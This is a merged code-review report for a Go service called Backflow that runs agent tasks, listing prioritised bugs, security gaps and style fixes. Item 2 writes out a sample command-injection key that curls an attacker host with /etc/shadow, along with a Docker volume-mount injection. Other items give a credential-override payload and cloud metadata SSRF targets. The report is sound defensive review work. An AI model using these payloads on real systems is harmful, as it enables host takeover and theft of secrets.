## Backflow Go — Consolidated Code Cleanup Report

Merged from two independent review reports (45 + 47 items). Duplicates across reports have been combined into single items; merged sources are annotated.

---

### P0 — Bug Risk
*Could cause runtime failures, credential theft, data races, or untracked cost.*

**1. `internal/orchestrator/docker/command.go:99` · `ec2/ec2.go:26` · `ec2/scaler.go:35` — [Data Race]** ✅ FIXED (PR #159 — sync.Once)
Three separate `ensureClient` / `ensureSSMClient` methods lazily initialize shared fields (`m.ssmClient`, `m.client`, `s.ssmClient`) without any synchronization. Log-streaming HTTP handlers and the orchestrator loop call these concurrently, creating a data race.
Suggested fix: Replace each lazy-init with `sync.Once`; initialize the client inside the `Once.Do` closure.

**2. `internal/orchestrator/docker/docker.go:144` — [Command Injection — CRITICAL]** *(Merged: R1#2 + R2#1)* ✅ FIXED (PR #158 — regex validation + shell escape)
User-supplied `EnvVars` map *keys* from the API are interpolated into `bash -c "docker run … -e KEY=VALUE …"` without validation or escaping. Only values are shell-escaped. A key like `A$(curl attacker.com/$(cat /etc/shadow))` executes arbitrary commands on the Docker host (local and SSM/EC2 modes). A key containing `--` (e.g. `"FOO --volume /:/mnt"`) also injects arbitrary Docker flags into the SSM-dispatched `bash -c` string.
Suggested fix: Validate all `EnvVars` keys against `^[A-Za-z_][A-Za-z0-9_]*$` in `CreateTaskRequest.Validate()`. Also apply `shellEscape()` to keys inside `envFlag()`.

**3. `internal/orchestrator/docker/docker.go:144` · `fargate/fargate.go:281` — [Credential Override]** ✅ FIXED (PR #158 — reserved key list)
User-supplied `task.EnvVars` are appended *after* system variables (`ANTHROPIC_API_KEY`, `GITHUB_TOKEN`). Docker resolves duplicate `-e` flags last-wins, so a task created with `{"env_vars": {"ANTHROPIC_API_KEY": "attacker-key"}}` silently overrides the real system credential. The same applies to Fargate ECS container overrides.
Suggested fix: Strip any key from `task.EnvVars` that matches a reserved system variable name before building the env flag list, or move system vars to the end so they cannot be overridden.

**4. `internal/orchestrator/docker/docker.go:135,138,141` — [Secrets Exposure]** ✅ FIXED (PR #158 — --env-file mechanism)
`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, and `GITHUB_TOKEN` are embedded as plaintext in the `docker run` command string. In EC2 mode this string is sent via SSM and lands in CloudWatch logs; in local mode it appears in `ps aux`.
Suggested fix: Pass secrets via `--env-file` (write to a temp file, `defer os.Remove` it) rather than inline in the command string.

**5. `internal/store/postgres.go:345,387,426,472,493` — [Sentinel Error Comparison]** *(Merged: R1#3 + R2#21)* ✅ FIXED (PR #159 — errors.Is)
Direct `err == pgx.ErrNoRows` comparisons (four or five locations depending on pgx version) break if the error is wrapped by any middleware or future pgx version; `errors.Is` is the correct idiom.
Suggested fix: Replace all with `errors.Is(err, pgx.ErrNoRows)`.

**6. `internal/store/postgres.go:478-479` — [Silent Data Loss]** *(Merged: R1#4 + R2#13)* ✅ FIXED (PR #159 — unmarshal errors returned)
`json.Unmarshal(allowedTools, &t.AllowedTools)` and `json.Unmarshal(envVars, &t.EnvVars)` errors are silently discarded in `scanPGTask()`. Corrupt DB content produces `nil`/empty fields with no log or error returned to the caller. Every task load in the system passes through this path.
Suggested fix: `if err := json.Unmarshal(allowedTools, &t.AllowedTools); err != nil { return nil, fmt.Errorf("unmarshal allowed_tools: %w", err) }`. Same for `envVars`.

**7. `internal/orchestrator/monitor.go` · `dispatch.go` · `orchestrator.go` — [Silent Orchestrator/Monitor/Dispatch Errors]** *(Merged: R1#5 + R1#12 + R2#14 + R2#15)* ✅ FIXED (PR #163 — log 12 errors, separate errNoCapacity from DB errors)
Approximately ten silently discarded errors across the orchestrator core:
- `monitor.go:258` — `CompleteTask` error in `killTask` is discarded; leaves task permanently stuck as `running` in DB.
- `monitor.go:33,37` — `StopContainer` and `ClearTaskAssignment` in `monitorCancelled`.
- `monitor.go:141,251` — `CompleteTask` failures in `handleCompletion` and other paths.
- `dispatch.go:37` — `UpdateTaskStatus` error after dispatch failure is silently ignored, leaving task permanently stuck.
- `dispatch.go:48` — `findAvailableInstance` returns both `errNoCapacity` and real DB errors, both handled identically by triggering scale-up; real DB errors are swallowed and cause spurious scale-up attempts.
- `orchestrator.go:237` — `DecrementRunningContainers` in `releaseInstanceSlot`.
- `orchestrator.go:251` — `UpdateInstanceStatus` in `markInstanceTerminated`.
Suggested fix: Log each error at warn level with the task/instance ID. For `CompleteTask` failures, consider retrying or alerting. For `findAvailableInstance`, check `errors.Is(err, errNoCapacity)` and propagate other errors separately.

**8. `internal/store/postgres.go:443-444` — [Transaction Safety]** *(Merged: R1#6 + R2#25)* ✅ FIXED (PR #159 — rollback error logged)
`tx.Rollback(ctx)` in `WithTx` discards its error return. A failed rollback can leave the connection in an undefined state and silently corrupt subsequent operations on that connection.
Suggested fix: `if rbErr := tx.Rollback(ctx); rbErr != nil { log.Warn().Err(rbErr).Msg("tx rollback failed") }`.

**9. `internal/orchestrator/ec2/scaler.go:132-148` — [Orphaned EC2 Instances]** ✅ FIXED (PR #158 — terminate on CreateInstance failure)
An EC2 instance is launched (line 132) before its DB record is created (line 148). If `CreateInstance()` fails, the function returns but the running instance is never tracked. Repeated failures create untracked, billing-accumulating instances.
Suggested fix: On `CreateInstance()` failure, call `TerminateInstance` on the newly-launched EC2 instance before returning the error.

**10. `internal/messaging/inbound.go:102` — [Authentication Bypass]** ✅ FIXED (PR #158 — unconditional validation)
Twilio signature validation is skipped entirely when `cfg.TwilioAuthToken == ""`. Any HTTP client can POST to `/webhooks/sms/inbound` and trigger task creation. A misconfigured deployment silently accepts unauthenticated requests with no operator warning.
Suggested fix: Emit a loud startup warning (or fatal log) when `TwilioAuthToken` is empty; require an explicit opt-out flag to disable validation rather than making "empty = skip" the default.

---

### P1 — Robustness
*Missing error checks, resource leaks, security gaps, and defensive improvements.*

**11. `internal/api/server.go:25-43` — [No Authentication]**
All REST endpoints (`POST /tasks`, `GET /tasks`, `GET /tasks/{id}`, `DELETE /tasks/{id}`, `GET /tasks/{id}/logs`) have zero authentication when `BACKFLOW_RESTRICT_API=false`. Any reachable client can create tasks targeting arbitrary repos, enumerate all task prompts, cancel tasks, and stream container logs.
Suggested fix: Add shared-secret API key middleware (e.g., `X-API-Key` header) applied to all `/api/v1/*` routes independent of the restrict flag.

**12. `internal/models/task.go:131` — [Insufficient Input Validation]**
`CreateTaskRequest.Validate()` does not check: (a) `repo_url` scheme — allows `file:///` and `http://169.254.169.254` SSRF targets; (b) unbounded `prompt`, `context`, `claude_md`, `pr_title`, `pr_body` fields — a 50 MB prompt causes memory exhaustion; (c) `EnvVars` key format (also P0 command injection); (d) `EnvVars` key count.
Suggested fix: Add URL scheme allowlist (`https://`, `git://`, `ssh://`); max-length constants for text fields (prompt <= 64 KB, etc.); `EnvVars` key regex + count cap (e.g., <= 50).

**13. `internal/messaging/inbound.go:141-167` — [Missing Event Emission + Duplicated Task Creation]** *(Merged: R1#9 + R2#20)*
The SMS inbound handler manually constructs a `models.Task`, calls `cfg.TaskDefaults().Apply()`, and calls `db.CreateTask()` — reimplementing what `api.NewTask()` already does — but never emits a `task.created` event. SMS-created tasks are invisible to the event bus: no Discord notification, no webhook, no SMS reply for creation. Also bypasses `api.NewTask` validation and duplicates ULID generation.
Suggested fix: Add `ReplyChannel` to `models.CreateTaskRequest` and route SMS through `api.NewTask` (passing the event bus), so all creation paths share the same logic, validation, and event emission.

**14. `internal/notify/webhook.go:127` — [Event Bus Starvation]**
`WebhookNotifier.Notify` calls `time.Sleep` synchronously in the event bus's single delivery goroutine during retries (up to 4 s per attempt). This blocks all other subscribers for the retry duration and can cause the 100-event buffer to overflow, silently dropping events.
Suggested fix: Run each `sub.Notify(event)` call in its own goroutine inside the delivery loop, or use a non-blocking `time.AfterFunc` for the retry delay.

**15. `internal/orchestrator/recovery.go:41,42,49,64,65,66,116` — [Silent Recovery Failures]** *(Merged: R1#11 + R2#16)* 🟡 PARTIAL (PR #163 — lines 41, 42, 49 fixed; lines 64, 65, 66, 116 remain)
Multiple store calls in startup recovery paths (`UpdateTaskStatus`, `ClearTaskAssignment`, `ResetRunningContainers`, `IncrementRunningContainers`) silently discard errors. Failures leave tasks stuck and instance capacity counts wrong — affecting all future scheduling decisions.
Suggested fix: Log each error. Recovery is critical-path; failures are high-value diagnostic signals. Allow startup to proceed but surface warnings clearly.

**16. `internal/orchestrator/ec2/scaler.go:159,168,191,192,195,215,221,250` — [Silent Scaler Store Errors]** *(Merged: R1#13 + R2#32)*
Seven `UpdateInstanceStatus` / `UpdateInstanceDetails` calls across scaler reconciliation loops discard errors. A persistent failure here causes phantom instances that block future scale-up. Additionally, `reconcilePending()` silently returns on `ListInstances()` error with no log message, unlike `RequestScaleUp()` which does log it.
Suggested fix: Log each error at warn level.

**17. `internal/api/handlers.go:163` — [Internal Error Leakage]** *(Merged: R1#14 + R2#27)*
AWS SSM and Docker errors are returned verbatim in 502 responses (`"failed to fetch logs: " + err.Error()`), exposing instance IDs, ARNs, IAM permission names, and region information to callers.
Suggested fix: Return a generic `"failed to fetch logs"` message to clients; log the full error server-side only.

**18. `internal/discord/create.go:176` · `interactions.go:295,329` — [Internal Error Leakage (Discord)]**
Store and validation errors are sent verbatim in Discord ephemeral messages, potentially leaking DB table names, constraint names, or connection details to Discord users.
Suggested fix: Return generic failure messages (`"Could not create task. Please try again."`); log internal details server-side.

**19. `internal/api/handlers.go:34` — [No Request Body Size Limit]**
The REST API applies no body size limit, unlike the Discord webhook handler which uses `io.LimitReader(r.Body, 64*1024)`. An arbitrarily large JSON body is fully decoded into memory.
Suggested fix: Add `r.Body = http.MaxBytesReader(w, r.Body, maxRequestBodyBytes)` in a middleware or at the top of each handler.

**20. `internal/api/handlers.go:69-77` — [Unbounded Pagination Limit]** *(Merged: R1#17 + R2#7)*
`GET /tasks?limit=N` only checks `n > 0`. A caller can request millions of rows, causing a large table scan and unbounded memory allocation.
Suggested fix: Cap at a reasonable maximum (e.g., 500) and return 400 for values above it.

**21. `internal/messaging/inbound.go:74` — [Webhook Signature Bypass]**
`requestURL()` trusts the `X-Forwarded-Host` header unconditionally when reconstructing the URL for Twilio HMAC verification. An attacker can set this header to cause the server to verify against a different URL, potentially invalidating all legitimate Twilio webhooks (DoS).
Suggested fix: Add `BACKFLOW_SMS_WEBHOOK_URL` config for a static canonical URL; fall back to header reconstruction only when unset.

**22. `internal/orchestrator/docker/docker.go:154` — [Path Injection]**
`ClaudeCredentialsPath` is interpolated into the Docker `-v` flag without `shellEscape()`. A path containing spaces breaks the command string; a crafted path could silently mount additional host directories.
Suggested fix: Apply `shellEscape(m.config.ClaudeCredentialsPath)` in `buildVolumeFlags()`.

**23. `cmd/backflow/main.go:162` — [Context Not Propagated]**
Discord cancel/retry callbacks capture `context.Background()` rather than the HTTP request context. These operations won't be cancelled on client disconnect or server shutdown.
Suggested fix: Add a `context.Context` parameter to `CancelTaskFunc` / `RetryTaskFunc`; pass `r.Context()` from the Discord interaction handler.

**24. `internal/notify/webhook.go:142` — [HTTP Keep-Alive / resp.Body Handling]** *(Merged: R1#21 + R2#29)*
On a 2xx response, `resp.Body.Close()` is called without draining the body first, preventing HTTP connection reuse and potentially leaving the connection pool degraded under load. Additionally, `resp.Body.Close()` is called imperatively (not deferred) inside the retry loop, which is fragile against future edits introducing early returns.
Suggested fix: Add `io.Copy(io.Discard, resp.Body)` before `resp.Body.Close()` on the success path; use `defer resp.Body.Close()` immediately after a successful `client.Do()`.

**25. `internal/store/postgres.go:78,82` · `internal/models/task.go:92,100,101,109` — [Silent Marshal Errors / Unused JSON Helpers]** *(Merged: R1#22 + R1#39 + R2#12)*
`json.Marshal` calls for `AllowedTools` and `EnvVars` in `CreateTask` use blank-identifier error discard. Additionally, `AllowedToolsJSON()` and `EnvVarsJSON()` on `Task` are exported but never called by any file in the codebase — `postgres.go` marshals these fields directly via `json.Marshal`. If they are used, they also silently discard marshal errors, returning `""` on failure.
Suggested fix: Return the marshal error from `CreateTask`. Confirm `AllowedToolsJSON` / `EnvVarsJSON` are unused with a project-wide search; if unused, delete both. If kept, return a safe fallback (`"[]"` / `"{}"`) and log the error.

**26. `internal/notify/webhook.go:129` — [SSRF on Webhook URL]** *(Merged: R1#45 + R2#8)*
`WebhookNotifier` POSTs to an operator-configured URL with the default `http.Client`, which follows redirects. A misconfigured or compromised webhook URL could route requests to internal services (e.g. `http://169.254.169.254/` AWS IMDS); the 3-retry loop amplifies the exposure.
Suggested fix: Validate the webhook URL at startup — reject non-http/https schemes and block RFC-1918/link-local address ranges. Configure the HTTP client with `CheckRedirect` blocking private IP ranges.

**27. `internal/discord/interactions.go:562` — [Discord Replay Attack]**
`verifySignature` validates the Ed25519 signature but never checks the age of the `X-Signature-Timestamp` header. A captured valid request can be replayed indefinitely against the service.
Suggested fix: Parse the timestamp and reject requests older than 5 minutes, per Discord's own security recommendations.

**28. `internal/api/handlers.go:102` — [DeleteTask Bypasses Shared Cancel Logic]**
`DeleteTask` reimplements cancel logic inline instead of calling the shared `api.CancelTask`. Consequences: (a) Pending tasks are hard-deleted with no cancellation event — webhooks, Discord, and SMS subscribers are never notified; (b) the `interrupted` status is not handled, causing interrupted tasks to be permanently deleted rather than cancelled.
Suggested fix: Replace the inline cancel logic with a call to `api.CancelTask`.

**29. `internal/models/task.go:26` — [Incorrect Terminal State]**
`IsTerminal()` returns `true` for `completed`, `failed`, and `cancelled` but omits `interrupted`. An interrupted task passes `!IsTerminal()` checks and is hard-deleted instead of cancelled. Since interrupted tasks are designed to auto-recover, this is likely unintentional.
Suggested fix: Add `TaskStatusInterrupted` to `IsTerminal()`, or add an explicit guard for it in `DeleteTask`.

**30. `internal/api/responses.go:16,22` — [json.Encode Errors Ignored]**
`json.NewEncoder(w).Encode(...)` errors silently ignored in both `writeJSON` and `writeError` — the only two JSON response helpers used throughout the entire API layer.
Suggested fix: Capture and log the error.

**31. `internal/orchestrator/docker/docker.go` (enrichFromStatusJSON) — [Exit Code Parse Error Ignored]**
`fmt.Sscanf(parts[1], "%d", &status.ExitCode)` error ignored. On parse failure, `ExitCode` stays `0`, making a failed container appear successful.
Suggested fix: Log on parse error and set a non-zero sentinel exit code (e.g. `-1`).

**32. `internal/discord/client.go:162` — [io.ReadAll Error Discarded]**
`io.ReadAll(resp.Body)` error discarded when building the diagnostic message for non-2xx responses. A failed read yields an empty string in the returned error, hiding the actual HTTP response body.
Suggested fix: Check the read error and include it in the returned error message.

**33. `internal/messaging/inbound.go:42` — [xml.Encode Error Not Checked]**
`xml.NewEncoder(w).Encode(resp)` error not checked in `writeTwiML()`. A 200 status is already written; a failed encode produces an empty body with no log.
Suggested fix: `if err := xml.NewEncoder(w).Encode(resp); err != nil { log.Error().Err(err).Msg("failed to encode TwiML response") }`.

---

### P2 — Maintainability
*Duplication, large functions, unclear abstractions, silent degradation.*

**34. `internal/notify/messaging.go:109` · `internal/discord/interactions.go:554` — [Duplicated Function]**
`truncate(s string, max int) string` (rune-safe, `"…"` suffix) is defined identically in two packages.
Suggested fix: Extract to `internal/stringutil` and import from both sites.

**35. `internal/notify/webhook.go:97` · `discord.go:35` · `messaging.go:21` — [Triplicated Pattern]**
The event-filter initialization (`make(map[EventType]bool)` + loop) and the `if d.events != nil && !d.events[event.Type]` guard are copy-pasted across all three notifier constructors and `Notify()` methods.
Suggested fix: Extract `buildEventFilter([]string) map[EventType]bool` and `shouldNotify(map[EventType]bool, EventType) bool` helpers in the `notify` package.

**36. `internal/orchestrator/docker/docker.go:103` · `fargate/fargate.go:235` — [Duplicated Env Building]**
`buildEnvFlags` (Docker, returns `[]string`) and `buildECSEnvVars` (Fargate, returns `[]ecstypes.KeyValuePair`) build the same 14+ agent environment variables — same fields, same conditionals, same `EnvVars` iteration — differing only in output type.
Suggested fix: Extract `taskEnvMap(task *models.Task, cfg *config.Config) map[string]string`; convert to the native type in each caller. Adding a new agent env var then requires a single change.

**37. `internal/notify/webhook.go:157` · `internal/models/task.go:82-86` — [Duplicated redactReplyChannel]** *(Merged: R1#26 + R2#34)*
`redactReplyChannel(string) string` (package function in `webhook.go`) and `(*Task).RedactReplyChannel()` (method in `task.go`) implement identical `strings.Index(rc, ":")` truncation logic.
Suggested fix: Have `webhook.go` call `task.RedactReplyChannel()` and delete the package-level duplicate.

**38. `internal/discord/interactions.go:168` — [Large Function]** *(Merged: R1#27 + R2#43)*
`handleApplicationCommand` is ~178 lines handling five subcommands (create, status, list, cancel, retry) in a single `switch`, each with its own option parsing, nil-checking, store calls, and response formatting.
Suggested fix: Extract `handleCreateCommand`, `handleStatusCommand`, `handleListCommand`, `handleCancelCommand`, `handleRetryCommand`.

**39. `cmd/backflow/main.go:58` — [Large Function]**
`main()` is ~177 lines wiring config, logging, DB, event bus, messaging, S3, runner, scaler, spot interruption, Discord, HTTP server, and graceful shutdown — all orthogonal concerns in a single function.
Suggested fix: Extract `setupMessaging(cfg, bus)`, `setupRunner(cfg, db, bus, s3)`, `setupDiscord(cfg, db, bus, router)`, `runServer(cfg, router, orch)` to reduce `main()` to a high-level sequence.

**40. `internal/store/store.go:34` — [Oversized Interface]**
`Store` declares 26 methods across tasks, instances, allowed senders, Discord installs, Discord threads, transactions, and close. Most callers use a small subset. The codebase already uses narrow interfaces (`discordTaskStore` in `interactions.go`, `discordThreadStore` in `notify/discord.go`).
Suggested fix: Define a `TaskStore` sub-interface for the API handlers; extend the established narrow-interface pattern to `InboundHandler` and other narrow consumers.

**41. `internal/messaging/inbound.go:93` — [Package Coupling]**
`InboundHandler` accepts a full `store.Store` but uses only `GetAllowedSender` and `CreateTask`. It also bypasses the event bus entirely (see item 13).
Suggested fix: Define a narrow `inboundStore interface { GetAllowedSender(…); CreateTask(…) }` parameter; pass a `notify.Emitter` for event emission.

**42. `internal/config/config.go:28` — [Struct Field Sprawl]**
`Config` has ~50 fields spanning AWS EC2, ECS/Fargate, Discord, SMS/Twilio, Slack, S3, GitHub, logging, database, and orchestrator concerns. `Load()` is consequently ~130 lines.
Suggested fix: Group into embedded sub-structs (`AWSConfig`, `DiscordConfig`, `SMSConfig`) for self-documentation without changing behavior.

**43. `cmd/migrate-to-postgres/main.go:300-306` — [Dead Code]** *(Merged: R1#32 + R2#45)*
`runGooseMigrations(pgConnStr, migrationsDir string) error` is defined but never called. Goose migration is already handled inside `store.NewPostgres()`.
Suggested fix: Delete the function.

**44. `internal/discord/commands.go:134` — [Missing Context]**
`http.NewRequest` used without a context. All other HTTP requests in the codebase use `http.NewRequestWithContext`. `staticcheck` flags this pattern.
Suggested fix: `http.NewRequestWithContext(context.Background(), http.MethodPut, url, bytes.NewReader(body))`.

**45. `internal/config/config.go:286,295` — [Silent Config Parse Failures]**
`envInt()` and `envFloat()` silently fall back to defaults on parse failure. A misconfigured `BACKFLOW_MAX_INSTANCES=foo` is indistinguishable from an unset variable — no log, no warning.
Suggested fix: Add a `log.Warn()` in the parse-fail branch.

**46. `internal/api/handlers.go:172` — [Health Endpoint Info Disclosure]**
The `/health` endpoint (not behind `RestrictAPI`, accessible on the public internet) returns `{"status":"ok","auth_mode":"api_key"}`, disclosing deployment configuration to unauthenticated callers.
Suggested fix: Return only `{"status":"ok"}`.

**47. `cmd/backflow/main.go:77` — [defer closer.Close Error Discarded]**
`defer closer.Close()` silently drops the error. If the underlying log buffer fails to flush (e.g. disk full), data is lost with no indication.
Suggested fix: Wrap in a `defer func() { if err := closer.Close(); err != nil { fmt.Fprintln(os.Stderr, err) } }()`.

**48. `internal/orchestrator/fargate/fargate.go` (InspectContainer) — [Log Fetch Failure Silent]**
CloudWatch log fetch failure is logged internally and silently skipped; `InspectContainer` returns a `ContainerStatus` without log data, and callers cannot distinguish "logs fetched" from "logs unavailable."
Suggested fix: Add a `LogsAvailable bool` field to `ContainerStatus`, or propagate the error to the caller.

**49. `internal/orchestrator/ec2/spot.go:55` — [Raw String Literals for SDK Types]** *(Merged: R1#36 + R2#24)*
AWS `InstanceStateName` values compared to raw string literals (`"shutting-down"`, `"terminated"`) rather than the typed SDK constants. The neighboring `scaler.go` uses `types.InstanceStateNameTerminated` consistently.
Suggested fix: Use `types.InstanceStateNameShuttingDown` and `types.InstanceStateNameTerminated`.

**50. `internal/config/config.go:201` — [envBool Reimplementation]** *(Merged: R1#41 + R2#22)*
`c.SMSOutboundEnabled = envOr("BACKFLOW_SMS_OUTBOUND_ENABLED", "true") == "true"` reimplements what the existing `envBool` helper already handles (including `"1"`, `"yes"`, `"false"`, `"0"`, `"no"`). This silently rejects `"1"`, `"yes"`, `"True"` — values that `envBool` handles correctly. Every other boolean config field uses `envBool`.
Suggested fix: `c.SMSOutboundEnabled = envBool("BACKFLOW_SMS_OUTBOUND_ENABLED", true)`.

---

### P3 — Style
*Naming, idioms, documentation, formatting, minor cleanup.*

**51. Multiple files — [Magic Numbers]** *(Merged: R1#33 + R2#41)*
Bare literals scattered across the codebase with no named constants: `50` (default task list limit, `handlers.go:72`), `100` (log tail lines, `handlers.go:154`), `10080` (thread archive minutes, `discord/client.go:134` and `notify/discord.go:18` — defined twice independently), `2000` (prompt max length, `discord/create.go:98`), `64*1024` (body limit, `interactions.go:125`), `100` (Discord thread name max, `notify/discord.go:295`), `100` (SMS truncation, `notify/messaging.go:93`), `30` (container stop timeout seconds, `docker/docker.go:76`), `7000`/`200`/`30` (ECS override size estimates, `fargate/fargate.go:347,409,411`), `1*time.Hour` (S3 presign expiry, `fargate/fargate.go:393`), `5*time.Minute` (pending instance timeout, `ec2/scaler.go:167`).
Suggested fix: Define a named constant adjacent to each usage; add a comment where the value is non-obvious (e.g., `// 7 days`, `// ECS container override JSON capped at ~8KB`).

**52. `internal/models/task.go:28-31` — [Untyped TaskMode Constants]** *(Merged: R1#34 + R2#37)*
`TaskMode` constants (`TaskModeAuto`, `TaskModeCode`, `TaskModeReview`) are bare `const string` while `TaskStatus` correctly uses `type TaskStatus string`. The compiler cannot catch misuse of task mode values.
Suggested fix: Add `type TaskMode string`; update `Task.TaskMode` and `CreateTaskRequest.TaskMode` to use it.

**53. `internal/models/task.go:149` — [Untyped Effort Constants]**
Effort levels (`"low"`, `"medium"`, `"high"`, `"xhigh"`) are validated against raw string literals in `Validate()`. Compare with `Harness`, which has a named type and typed constants.
Suggested fix: Add `type Effort string` with named constants, consistent with `Harness`.

**54. `internal/discord/client.go:78-82` — [Dead Constants]**
`ButtonStyleSecondary = 2` and `ButtonStyleSuccess = 3` are defined but never referenced anywhere in the codebase. Only `ButtonStyleDanger` and `ButtonStylePrimary` are used.
Suggested fix: Remove the two unused constants.

**55. `internal/discord/interactions.go:33` — [Dead Constant]**
`ResponseTypeDeferredChannelMessage = 5` is defined but never used.
Suggested fix: Remove, or add a `// reserved for future use` comment.

**56. `internal/discord/commands.go:47,52,65,70,89,100,102,114,117` · `interactions.go:461,463` — [Discord API Type Magic Numbers]** *(Merged: R1#40 + R2#42)*
Discord API type integers (`1`, `3`, `4`, etc.) use inline comments (`// CHAT_INPUT`, `// SUB_COMMAND`, `// STRING`, `// INTEGER`) to explain their meaning — the comments prove they should be constants. `interactions.go:461` uses `1` for SUB_COMMAND without even a comment.
Suggested fix: Define `DiscordTypeChatInput`, `DiscordOptionTypeSubCommand`, `DiscordOptionTypeString`, `DiscordOptionTypeInteger` as named constants in the `discord` package.

**57. `internal/orchestrator/fargate/fargate.go:317-318` — [Redundant Helpers]** *(Merged: R1#42 + R2#36)*
`containerName()`, `logStreamPrefix()`, and `launchType()` guard against empty config fields, but `config.Load()` already initializes all three to their defaults via `envOr()`. The fallback logic is unreachable under normal operation; the defaults now live in two places.
Suggested fix: Access `m.config.ECSContainerName`, `m.config.ECSLogStreamPrefix`, `m.config.ECSLaunchType` directly; delete the three helper methods.

**58. `internal/messaging/inbound.go:121` · `internal/discord/interactions.go:132` — [Sensitive Data in Logs]**
Full SMS message bodies are logged at Debug level (`inbound.go:121`) — may log confidential prompts. The raw Ed25519 hex signature from Discord is also logged at Debug level (`interactions.go:132`), logging cryptographic material unnecessarily.
Suggested fix: Log `len(body)` instead of the SMS body content; remove the `Str("signature", signature)` field from the Discord debug log.

**59. `internal/discord/interactions.go:195` — [Undocumented Authorization Scope]**
`status`, `list`, and `create` Discord subcommands perform no `hasPermission` check. Any server member can enumerate all task IDs, view full prompts and repo URLs, and open the task-creation modal — regardless of `BACKFLOW_DISCORD_ALLOWED_ROLES`.
Suggested fix: Apply `hasPermission` to `create`, `status`, and `list` if task data is considered sensitive; otherwise add a comment explicitly documenting that these commands are open to all server members.

**60. `internal/notify/event.go:46` — [Shadow Struct in MarshalJSON]**
`MarshalJSON` on `Event` manually re-declares the entire struct as `eventJSON`. Adding a field to `Event` requires updating both structs and the copy block with no compile-time enforcement.
Suggested fix: Use the type-alias idiom: `type alias Event; a := alias(e); a.ReplyChannel = redactReplyChannel(e.ReplyChannel); return json.Marshal(a)`.

**61. `internal/orchestrator/orchestrator.go:27` — [Misleading Field Name]**
The `Orchestrator` struct field `docker Runner` and its exported accessor `Docker() Runner` use a Docker-specific name for an interface that holds a `fargate.Manager` in Fargate mode — actively misleading.
Suggested fix: Rename the field to `runner` and the method to `Runner()`; update callers in `api/server.go` and `cmd/backflow/main.go`.

**62. `internal/config/defaults.go:28` — [Method/Type Name Conflict]**
The method `TaskDefaults` on `*Config` returns a value of type `TaskDefaults`. Method and type share the exact same name in the same package, which reads as if calling a type constructor.
Suggested fix: Rename the method to `GetTaskDefaults` or `DefaultsForMode`.

**63. `internal/orchestrator/runner.go:57` — [Sentinel Error Idiom]**
Sentinel error defined with `fmt.Errorf` despite having no format verbs.
Suggested fix: `var errNoCapacity = errors.New("no instance capacity available")`.

**64. `internal/orchestrator/ec2/scaler.go:184` — [aws.ToString Idiom]**
Manual nil-guard before pointer dereference (`if ec2Inst.PrivateIpAddress != nil { ip = *ec2Inst.PrivateIpAddress }`) instead of the `aws.ToString()` helper used consistently elsewhere in the codebase.
Suggested fix: `ip = aws.ToString(ec2Inst.PrivateIpAddress)`.

**65. `internal/config/defaults.go:94` — [Over-Engineered Accessors]**
Three private accessors `createPR()`, `selfReview()`, `saveAgentOutput()` exist solely to nil-guard `*BoolOverrides` — 18 lines for three nil-checks.
Suggested fix: Inline the nil-check directly in `Apply`: `if overrides != nil && overrides.CreatePR != nil { ... }`.

**66. `cmd/backflow/main.go:236` — [Unnecessary Abstraction]**
`logConfiguredNotificationChannels` is a one-`if` wrapper with no meaningful abstraction.
Suggested fix: Inline the `if` block directly in `main()` and delete the function.

**67. `internal/discord/create.go:77` — [Grammar]**
`"an MODAL_SUBMIT"` should be `"a MODAL_SUBMIT"`.
Suggested fix: Fix the article.

---

### Summary by tier

| Tier | Count | Highlights |
|---|---|---|
| **P0 Bug risk** | 10 | 3 data races on lazy-init clients; command injection + credential override via `EnvVars` keys; secrets in command strings; orphaned EC2 instances; silent DB state inconsistency; broken transaction rollback; Twilio auth bypass |
| **P1 Robustness** | 23 | No API auth; missing input validation + SSRF on `repo_url`; SMS tasks never emit events; event bus starvation on webhook retries; ~15 silently dropped orchestrator/recovery/scaler errors; internal errors leaked to clients; Discord replay; unbounded pagination; webhook SSRF |
| **P2 Maintainability** | 17 | 3 duplicated env/event-filter/truncate builders; duplicated `redactReplyChannel`; two 175-line functions; 26-method `Store` interface; dead `runGooseMigrations`; silent config parse failures; health endpoint info disclosure |
| **P3 Style** | 17 | Pervasive magic numbers; `TaskMode`/`Effort` untyped strings; dead constants; Discord API type integers; `envBool` reimplementation; misleading field names; sensitive data in debug logs |

---

### Appendix: Merge Map

The following items were identified as duplicates across the two source reports and merged. 22 merge groups eliminated 25 duplicate entries (92 → 67 unique items).

| Merged Item # | review.txt | review2.txt | Topic |
|---|---|---|---|
| 2 | #2 | #1 | Command Injection via EnvVars keys |
| 5 | #3 | #21 | pgx.ErrNoRows sentinel comparison |
| 6 | #4 | #13 | Silent json.Unmarshal in scanPGTask |
| 7 | #5, #12 | #14, #15 | Silent orchestrator/monitor/dispatch errors |
| 8 | #6 | #25 | tx.Rollback error discarded |
| 13 | #9 | #20 | SMS task creation bypasses api.NewTask |
| 15 | #11 | #16 | Silent recovery failures |
| 16 | #13 | #32 | Silent scaler store errors |
| 17 | #14 | #27 | Internal error leakage (API) |
| 20 | #17 | #7 | Unbounded pagination limit |
| 24 | #21 | #29 | resp.Body handling in webhook.go |
| 25 | #22, #39 | #12 | Silent marshal errors / unused JSON helpers |
| 26 | #45 | #8 | SSRF on webhook URL |
| 37 | #26 | #34 | Duplicated redactReplyChannel |
| 38 | #27 | #43 | Large function handleApplicationCommand |
| 43 | #32 | #45 | Dead code runGooseMigrations |
| 49 | #36 | #24 | EC2 state raw string literals |
| 50 | #41 | #22 | envBool reimplementation |
| 51 | #33 | #41 | Magic numbers (general) |
| 52 | #34 | #37 | Untyped TaskMode constants |
| 56 | #40 | #42 | Discord API type magic numbers |
| 57 | #42 | #36 | Redundant fargate helpers |
